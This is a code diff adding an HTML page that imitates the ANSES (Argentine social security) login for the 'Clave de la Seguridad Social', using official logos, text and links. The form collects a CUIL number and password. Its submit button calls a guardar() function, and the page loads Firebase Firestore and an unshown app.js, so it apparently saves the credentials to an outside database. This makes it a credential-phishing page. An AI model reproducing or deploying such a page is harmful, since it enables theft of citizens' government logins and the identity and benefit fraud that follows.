@@ -1,0 +1,245 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+
+     <!-- Firebase App (the core Firebase SDK) is always required and must be listed first -->
+  <script src="https://www.gstatic.com/firebasejs/6.2.0/firebase-app.js"></script>
+
+  <!-- Add Firebase products that you want to use -->
+<script src="https://www.gstatic.com/firebasejs/7.2.3/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.2.3/firebase-firestore.js"></script>
+
+
+    <title>Anses | Clave de la Seguridad Social</title>
+  </head>
+  <body style="background: #f9f9f9;">
+
+        <div class="top-header pt-4 pb-4" style="background-color: #005296">
+        <div class="container ">
+            <div class="row">
+                <div class="col-sm-12 d-block d-md-flex">
+                    <img src="recursos/img/logo.png">
+                    <h1 class="title display-4 " style="color: white;"> | Clave de la Seguridad Social </h1>
+
+
+<style type="text/css">
+  
+.title{
+  font-size: 250%
+}
+@media(max-width: 700px){
+
+  .title{
+
+     font-size: 100%
+
+
+  }
+
+  .container{
+margin-left: 20%;
+margin-right: 20%;
+
+
+  }
+
+
+
+
+}
+
+
+</style>
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+  
+<div class="con0 mx-1 mx-md-4">
+<div class="con1 mx-0 mx-md-5">
+  <div class="con2 mx-0 mx-md-5">
+    <div class="con3 mx-0 mx-md-5">
+<div class="container0 mx-2 mx-md-5">
+<div class="cont00">
+<h1 class="display-5 pt-4" style="margin-left: 5%;">MiAnses</h1>
+
+<div style="margin-left: 5%; margin-right: 5%; margin-top:2%; margin-bottom: 2%" >
+
+  Necesitas tener tu clave de seguridad social o crear una para ingresar.
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+
+<div class="con0 mx-1 mx-md-4">
+<div class="con1 mx-0 mx-md-5">
+  <div class="con2 mx-0 mx-md-5">
+    <div class="con3 mx-0 mx-md-5">
+<div class="container0 mx-2 mx-md-5">
+
+<div class= "contenedor border border-secondary rounded " style="margin-left: 5%;   margin-right: 5%; background-color: white">
+ 
+
+
+  <div class="frm "style="margin: 5%">
+  <div class="fg" >
+
+
+    <label for="exampleInputEmail1">Número de CUIL</label>
+
+    <input type="text" class="form-control" id="usuario" aria-describedby="emailHelp"  
+
+     placeholder="__-________-_">
+
+
+<a href="https://www.anses.gob.ar/consulta/constancia-de-cuil" target="new">
+    <small id="emailHelp" class="form-text text-muted" style="padding-left: 75%;">No sé mi CUIL</small>
+</a>
+  </div>
+  <div class="fg">
+    <label for="exampleInputPassword1">Clave de Seguridad Social</label>
+    <input type="password" class="form-control" id="contraseña">
+     <small id="emailHelp" class="form-text text-muted">Si estás utilizando una PC de uso público, para tu mayor seguridad podes utilizar el teclado virtual.</small>
+      <small id="emailHelp" class="form-text text-muted">Cambiar la Clave</small>
+  </div>
+
+
+  <button type="submit" class="btn btn-primary btn-lg btn-block" id="boton" onclick="guardar()"  style="    background-color: #005296; width: 60%; margin-left: 20%; margin-right: 20%" >Ingresar</button>
+
+<!--<META HTTP-EQUIV="REFRESH" CONTENT="5;URL=http://www.desarrolloweb.com"> 
+-->
+</div>
+
+
+</div>
+
+</div>
+
+</div>
+</div>
+</div>
+
+</div>
+
+
+
+
+
+
+
+<div class="con0 mx-0 mx-md-4">
+<div class="con1 mx-0 mx-md-5">
+  <div class="con2 mx-0 mx-md-5">
+    <div class="con3 mx-0 mx-md-5">
+<div class="container0 mx-2 mx-md-5">
+
+<div class="contenedor2 ">
+
+<div style="margin-left: 5%; margin-right: 5%; margin-top:2%; margin-bottom: 2%" >
+Aquí podes crear tu Clave de la Seguridad Social, necesaria para realizar algunos de los trámites disponibles en la página de ANSES.
+</div>
+
+
+
+            <div>
+            
+                <a class="media btn btn-negative" href="https://servicioscorp.anses.gob.ar/clavelogon/logon.aspx?tramite=1">
+                 
+                    <div class="media-body border border-secondary rounded pt-3" style="margin-left: 3%; margin-right: 3%">
+                        <h4>Creá tu Clave</h4>
+                        <p class="text-muted">Ingresá para obtener tu Clave de la Seguridad Social</p>
+                    </div>
+                </a>
+                <a class="media btn btn-negative" href="https://servicioscorp.anses.gob.ar/claveuser/default.aspx/preguntasfrecuentes">
+                   
+                    <div class="media-body border border-secondary rounded pt-3" style="margin-left: 3%; margin-right: 3%;">
+                        <h4>Preguntas Frecuentes</h4>
+                        <p class="text-muted">Si necesitás mas información, consultá este apartado.</p>
+                    </div>
+                </a>
+                <div class="panel panel-primary p-3 mt-4" style="margin-left: 5%; margin-right: 5%;background-color: #337ab7; color: white">
+                    <div class="panel-heading">
+                        <h4 class="text-center">GESTIÓN DE LA CLAVE A TRAVÉS DE UN APODERADO</h4>
+                        <p>
+                            Si no podes concurrir personalmente a la ANSES para obtener tu clave, sea porque te encontras imposibilitado o
+                            bien porque te encontras residiendo en el EXTERIOR, descargá, firmá y hacé certificar esta <strong><a style="color: #FFF; text-decoration:underline" href="https://servicioscorp.anses.gob.ar/claveuser/aspx/cartapoder.aspx" target="_blank">Carta Poder</a></strong>
+                            y la copia de tu Documento de Identidad, para que tu APODERADO las presente en tu nombre. (Consulta <strong><a style="color: #FFF; text-decoration:underline" href="https://servicioscorp.anses.gob.ar/clavelogon/logon.aspx?system=mianses#" data-toggle="modal" data-target="#myModal">AQUÍ</a></strong>, las autoridades certificantes competentes para certificar tu firma y copia del documento)
+                        </p>
+                    </div>
+                </div>
+
+
+
+
+
+
+
+
+
+                <div class="panel panel-primary p-3 mt-4" style="margin-left: 5%; margin-right: 5%;background-color: #337ab7; color: white">
+                    <div class="panel-heading">
+                        <h4 class="text-center">GESTIÓN DE LA CLAVE PARA RESIDENTES EN EL EXTERIOR, SIN APODERADO</h4>
+                        <p>
+                            Si residís en el EXTERIOR y no tenes apoderado descargá, firmá y hace certificar este <strong><a style="color: #FFF; text-decoration:underline" href="https://servicioscorp.anses.gob.ar/claveuser/aspx/responsabilidad.aspx" target="_blank">FORMULARIO USI07</a></strong> y la copia de tu Documento de Identidad, 
+                            a través del Consulado del país donde te encuentres, o a través del Sistema Simplificado de Apostillas, 
+                            y luego remitilos por correo postal a la UNIDAD COORDINADORA DE APOYO OPERATIVO -UCAO- de ANSES (sita en Av. Paseo Colón 239, 6to. Piso Frente, Cód. Postal C1063ACO, Ciudad Autónoma de Buenos Aires, ARGENTINA)
+                        </p>
+                    </div>
+                </div>
+
+
+
+
+                <div class="panel panel-primary p-3 mt-4" style="margin-left: 5%; margin-right: 5%;background-color: #337ab7; color: white">
+                    <div class="panel-heading">
+                        <h4 class="text-center">ORGANISMOS PÚBLICOS EN GENERAL</h4>
+                        <p>
+                            Los operadores designados a operar con Clave Corporativa que deseen gestionar su clave a través de GDE, deberán completar este <strong><a style="color: #FFF; text-decoration:underline" href="https://servicioscorp.anses.gob.ar/claveuser/aspx/responsabilidad.aspx" target="_blank">FORMULARIO USI07</a></strong> y, junto con el escaneo del DNI, remitirlo por dicho sistema a UCAO#ANSES / MESA.
+                        </p>
+                    </div>
+                </div>
+
+                <div class="ult py-4"style="margin-left: 5%; margin-right: 5%">
+                <p><a class="btn btn-primary btn-block" href="https://servicioscorp.anses.gob.ar/claveuser/ayuda/ManualUsuarioCVSS_V06.pdf" target="_blank" ><i class="fa fa-file-pdf-o fa-lg"></i> &nbsp; Manual del Usuario</a></p>
+             </div>
+             
+       </div>
+
+
+</div>
+
+</div>
+</div>
+</div>
+</div>
+</div>
+
+
+
+
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+
+    
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+
+
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+ <script src="app.js"></script>
+
+  </body>
+</html>
